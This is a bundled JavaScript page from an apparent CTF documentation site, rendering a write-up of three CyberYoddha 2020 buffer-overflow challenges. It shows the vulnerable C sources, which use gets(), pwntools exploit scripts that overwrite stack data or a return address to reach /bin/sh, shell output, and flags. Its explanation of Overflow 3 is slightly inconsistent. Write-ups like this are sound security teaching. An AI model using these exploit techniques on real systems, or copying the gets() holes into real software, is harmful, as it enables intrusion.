"use strict";(self.webpackChunkweb_ctf=self.webpackChunkweb_ctf||[]).push([[896],{1447:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>t,metadata:()=>l,toc:()=>d});var r=s(5893),o=s(1151);const t={},i="Overflow 1 (125 points)",l={id:"writeups/CyberYoddha/2020/overflow",title:"Overflow 1 (125 points)",description:"Description",source:"@site/docs/writeups/CyberYoddha/2020/overflow.md",sourceDirName:"writeups/CyberYoddha/2020",slug:"/writeups/CyberYoddha/2020/overflow",permalink:"/ctf-docs/docs/writeups/CyberYoddha/2020/overflow",draft:!1,unlisted:!1,editUrl:"https://github.com/boyney123/eventcatalog/edit/master/website/docs/writeups/CyberYoddha/2020/overflow.md",tags:[],version:"current",lastUpdatedBy:"kostezy",frontMatter:{},sidebar:"writeups",previous:{title:"Writeups",permalink:"/ctf-docs/docs/writeups/"},next:{title:"Password 1 (125 points)",permalink:"/ctf-docs/docs/writeups/CyberYoddha/2020/password"}},c={},d=[{value:"Description",id:"description",level:2},{value:"Solution",id:"solution",level:2},{value:"Description",id:"description-1",level:2},{value:"Solution",id:"solution-1",level:2},{value:"Description",id:"description-2",level:2},{value:"Solution",id:"solution-2",level:2}];function a(e){const n=Object.assign({h1:"h1",h2:"h2",p:"p",a:"a",pre:"pre",code:"code",strong:"strong"},(0,o.ah)(),e.components);return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"overflow-1-125-points",children:"Overflow 1 (125 points)"}),"\n",(0,r.jsx)(n.h2,{id:"description",children:"Description"}),"\n",(0,r.jsx)(n.p,{children:"ez overflow."}),"\n",(0,r.jsx)(n.p,{children:"nc cyberyoddha.baycyber.net 10001"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{target:"_blank",href:s(4003).Z+"",children:"Overflow1"}),";\n",(0,r.jsx)(n.a,{target:"_blank",href:s(5325).Z+"",children:"Overflow1.c"})]}),"\n",(0,r.jsx)(n.h2,{id:"solution",children:"Solution"}),"\n",(0,r.jsx)(n.p,{children:"Here is the file we were given."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"int main(void) {\n  char str[] = \"AAAA\";\n  char buf[16];\n\n  gets(buf);\n  \n  if (!(str[0] == 'A' && str[1] == 'A' && str[2] == 'A' && str[3] == 'A')){\n    system(\"/bin/sh\");\n  }\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:"Buffer is defined as 16, so let's write small python script using pwntools."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\npayload = "A"*16\n\ns = remote("cyberyoddha.baycyber.net", 10001)\ns.sendline(payload)\ns.interactive()\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"$ python overflow1.py\n[+] Opening connection to cyberyoddha.baycyber.net on port 10001: Done\n[*] Switching to interactive mode\n$ ls\nflag.txt\noverflow1\n$ cat flag.txt\nCYCTF{st@ck_0v3rfl0ws_@r3_3z}\n"})}),"\n",(0,r.jsx)(n.p,{children:"This task can be done easier: just enter 16 A using nc and get the flag"}),"\n",(0,r.jsx)(n.p,{children:"Flag: CYCTF{st@ck_0v3rfl0ws_@r3_3z}"}),"\n",(0,r.jsx)(n.h1,{id:"overflow-2-225-points",children:"Overflow 2 (225 points)"}),"\n",(0,r.jsx)(n.h2,{id:"description-1",children:"Description"}),"\n",(0,r.jsx)(n.p,{children:"ez overflow (or is it?)"}),"\n",(0,r.jsx)(n.p,{children:"nc cyberyoddha.baycyber.net 10002"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{target:"_blank",href:s(2929).Z+"",children:"Overflow2"}),";\n",(0,r.jsx)(n.a,{target:"_blank",href:s(5820).Z+"",children:"Overflow2.c"})]}),"\n",(0,r.jsx)(n.h2,{id:"solution-1",children:"Solution"}),"\n",(0,r.jsx)(n.p,{children:"Here is the file we were given."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'void run_shell(){\n system("/bin/sh");\n}\n\nvoid vuln(){\n char buf[16];\n gets(buf);\n}\n\nint main(void) {\n vuln();  \n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["So we need to jump over to ",(0,r.jsx)(n.strong,{children:"run_shell"})," function using buffer overflow.\n",(0,r.jsx)(n.a,{href:"https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/",children:"Writeup for a similar task"})]}),"\n",(0,r.jsxs)(n.p,{children:["Let's find address of ",(0,r.jsx)(n.strong,{children:"run_shell"})," function using ",(0,r.jsx)(n.strong,{children:"objdump"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"$ objdump -d overflow2\n...\n08049172 <run_shell>:                \n 8049172:       55                      push   %ebp\n 8049173:       89 e5                   mov    %esp,%ebp\n 8049175:       53                      push   %ebx\n 8049176:       83 ec 04                sub    $0x4,%esp\n 8049179:       e8 63 00 00 00          call   80491e1 <__x86.get_pc_thunk.ax>\n 804917e:       05 82 2e 00 00          add    $0x2e82,%eax\n 8049183:       83 ec 0c                sub    $0xc,%esp\n...\n"})}),"\n",(0,r.jsxs)(n.p,{children:["Address is ",(0,r.jsx)(n.strong,{children:"0x8049172"})," and buffer size is 28. Now let's open python and write another script:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\npayload = "A"*28\npayload += p32(0x8049172)\ns = remote("cyberyoddha.baycyber.net", 10002)\ns.sendline(payload)\ns.interactive()\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"$ python overflow2.py\n[+] Opening connection to cyberyoddha.baycyber.net on port 10002: Done\n[*] Switching to interactive mode\n$ ls\nflag.txt\noverflow2\n$ cat flag.txt\nCYCTF{0v3rfl0w!ng_v@ri@bl3$_i$_3z}\n"})}),"\n",(0,r.jsx)(n.p,{children:"Flag: CYCTF{0v3rfl0w!ng_v@ri@bl3$_i$_3z}"}),"\n",(0,r.jsx)(n.h1,{id:"overflow-3-250-points",children:"Overflow 3 (250 points)"}),"\n",(0,r.jsx)(n.h2,{id:"description-2",children:"Description"}),"\n",(0,r.jsx)(n.p,{children:"looks like buffer overflows aren\u2019t so easy anymore."}),"\n",(0,r.jsx)(n.p,{children:"nc cyberyoddha.baycyber.net 10003"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{target:"_blank",href:s(4627).Z+"",children:"Overflow3"}),";\n",(0,r.jsx)(n.a,{target:"_blank",href:s(291).Z+"",children:"Overflow3.c"})]}),"\n",(0,r.jsx)(n.h2,{id:"solution-2",children:"Solution"}),"\n",(0,r.jsx)(n.p,{children:"Here is the file we were given."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'int main(void) {\n long vuln = 0;\n        char buf[16];\n\n gets(buf);\n\n if (vuln == 0xd3adb33f){\n  system("/bin/sh");\n }\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["Address is ",(0,r.jsx)(n.strong,{children:"0xd3adb33f"})," and buffer size is 16. Now let's open python and write another script:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\npayload = "A"*28\npayload += p32(0xd3adb33f)\ns = remote("cyberyoddha.baycyber.net", 10003)\ns.sendline(payload)\ns.interactive()\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"$ python overflow3.py\n[+] Opening connection to cyberyoddha.baycyber.net on port 10003: Done\n[*] Switching to interactive mode\n$ ls\nflag.txt\noverflow3\n$ cat flag.txt\nCYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}\n"})}),"\n",(0,r.jsx)(n.p,{children:"Flag: CYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}"})]})}const h=function(e={}){const{wrapper:n}=Object.assign({},(0,o.ah)(),e.components);return n?(0,r.jsx)(n,Object.assign({},e,{children:(0,r.jsx)(a,e)})):a(e)}},4003:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/files/Overflow1-ebc1c084ae00fd09533c647031ce9c26.elf"},2929:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/files/Overflow2-94710ffb38e0131aba8ab7c0f483c3f2.elf"},4627:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/files/Overflow3-955068b3fb9b835b3ead7f0d9105f682.elf"},5325:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/files/overflow1-dd1e12460ebb99f852296bf14bfafcaa.c"},5820:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/files/overflow2-6c665888021e4b219736701a639283de.c"},291:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/files/overflow3-8641abe1549bf3c654c9122debf20f20.c"},1151:(e,n,s)=>{s.d(n,{Zo:()=>l,ah:()=>t});var r=s(7294);const o=r.createContext({});function t(e){const n=r.useContext(o);return r.useMemo((()=>"function"==typeof e?e(n):{...n,...e}),[n,e])}const i={};function l({components:e,children:n,disableParentContext:s}){let l;return l=s?"function"==typeof e?e({}):e||i:t(e),r.createElement(o.Provider,{value:l},n)}}}]);